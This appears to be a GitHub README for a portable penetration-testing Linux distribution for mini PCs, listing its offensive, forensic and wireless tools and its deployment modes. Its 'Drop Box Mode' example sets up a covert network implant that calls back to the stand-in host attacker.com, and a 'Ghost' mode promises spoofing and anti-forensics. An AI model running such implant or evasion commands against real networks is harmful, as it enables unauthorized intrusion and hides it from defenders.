<div align="center">

# 🖥️ NullSec Linux Micro Edition

[![Version](https://img.shields.io/badge/Version-1.0.0-58a6ff?style=for-the-badge)](https://github.com/bad-antics/nullsec-linux-micro)
[![Platform](https://img.shields.io/badge/Platform-x86__64-0078D4?style=for-the-badge&logo=intel&logoColor=white)](https://github.com/bad-antics/nullsec-linux-micro)
[![License](https://img.shields.io/badge/License-GPL--3.0-3fb950?style=for-the-badge)](LICENSE)

**Portable Security Station for Mini PCs & Intel NUC**

*Field deployment • Covert operations • Mobile security lab • Drop box capable*

[Features](#features) • [Hardware](#supported-hardware) • [Download](#download) • [Deploy](#deployment)

</div>

---

## 🎯 Overview

NullSec Linux Micro is a compact, high-performance security distribution designed for mini PCs, Intel NUCs, and portable x86_64 hardware. Deploy a full-featured penetration testing platform in a pocket-sized form factor.

## ✨ Features

| Feature | Description |
|---------|-------------|
| 💨 **Ultra Fast Boot** | Boot to desktop in <15 seconds on NVMe |
| 🎭 **Stealth Operation** | Silent fans, no LEDs, covert deployment |
| 📡 **Multi-Radio** | WiFi 6E, Bluetooth 5.3, optional SDR |
| 🔋 **Battery Ready** | USB-C PD support, UPS integration |
| 🌐 **Network TAP** | Dual Ethernet for inline monitoring |
| 🔒 **Full Disk Encryption** | LUKS2 with TPM unlock option |
| 📦 **Persistent Storage** | Encrypted evidence partition |

## 🖥️ Supported Hardware

### Recommended

| Device | CPU | RAM | Storage | Notes |
|--------|-----|-----|---------|-------|
| Intel NUC 13 Pro | i7-1360P | 32GB | 1TB NVMe | Best performance |
| Intel NUC 12 | i7-1260P | 16GB | 512GB | Great balance |
| Minisforum UM790 | Ryzen 9 7940HS | 32GB | 1TB | AMD option |
| Beelink SER5 | Ryzen 5 5560U | 16GB | 500GB | Budget friendly |
| GMKtec NucBox | N100 | 8GB | 256GB | Ultra portable |

### Also Compatible
- ASUS Mini PC
- Lenovo ThinkCentre Tiny
- HP ProDesk Mini
- Dell OptiPlex Micro
- Any x86_64 with 4GB+ RAM

## 📦 Editions

### 🔥 Station Edition (~8GB)
Full security workstation with GUI, all tools, multi-monitor support.

### ⚡ Tactical Edition (~4GB)
Optimized for field deployment, fast boot, essential tools.

### 🎭 Ghost Edition (~3GB)
Maximum stealth - no persistent storage, RAM-only operation, auto-destruct.

## 🛠️ Tool Categories

<details>
<summary><b>🌐 Network (40+ tools)</b></summary>

- Full Nmap Scripting Engine
- Wireshark + packet capture
- Responder, MITM tools
- VPN/Proxy chaining
- Network TAP utilities

</details>

<details>
<summary><b>🔓 Exploitation (30+ tools)</b></summary>

- Metasploit Framework
- Cobalt Strike compatible
- Custom exploit frameworks
- Payload generation
- Post-exploitation

</details>

<details>
<summary><b>🔍 Forensics (25+ tools)</b></summary>

- Autopsy, Sleuth Kit
- Volatility 3
- Memory acquisition
- Disk imaging
- Evidence handling

</details>

<details>
<summary><b>📻 Wireless (20+ tools)</b></summary>

- WiFi 6E attacks
- Bluetooth fuzzing
- SDR integration
- Protocol analysis
- Rogue AP

</details>

## 🚀 Deployment Modes

### Desktop Mode
```bash
# Standard desktop with all tools
nullsec-mode desktop
```

### Kiosk Mode
```bash
# Single-app mode for specific tasks
nullsec-mode kiosk --app wireshark
```

### Drop Box Mode
```bash
# Covert network implant
nullsec-dropbox enable \
  --callback attacker.com:443 \
  --protocol https \
  --interval 300 \
  --stealth max
```

### TAP Mode
```bash
# Inline network monitoring
nullsec-tap enable --bridge eth0 eth1
```

## 🎭 Stealth Features

```bash
# Full stealth activation
sudo nullsec-ghost enable

# Includes:
# ✓ MAC randomization (all interfaces)
# ✓ Hostname spoofing
# ✓ BIOS/UEFI fingerprint masking
# ✓ Disable all LEDs
# ✓ Silent fan profile
# ✓ Traffic obfuscation
# ✓ Anti-forensics mode
```

## 💾 Installation

### USB Boot (Recommended for Ghost)
```bash
# Create bootable USB
sudo dd if=nullsec-micro-ghost.iso of=/dev/sdX bs=4M status=progress
```

### NVMe Install (Station/Tactical)
```bash
# Boot from USB, then:
sudo nullsec-install /dev/nvme0n1 --edition station --encrypt
```

## 🔐 Security Features

- **Secure Boot** compatible (signed kernel)
- **LUKS2** full disk encryption
- **TPM 2.0** key storage (optional)
- **Measured Boot** with attestation
- **Memory encryption** (AMD SME/SEV)

## 🔗 Integration

Works seamlessly with:
- [NullSec Linux](https://github.com/bad-antics/nullsec-linux) - Main distro
- [NullSec Pi](https://github.com/bad-antics/nullsec-linux-pi) - Raspberry Pi
- [NullSec Flipper](https://github.com/bad-antics/nullsec-flipper-suite) - Flipper Zero

---

<div align="center">

**[bad-antics](https://github.com/bad-antics)** • *For authorized security testing only*

</div>
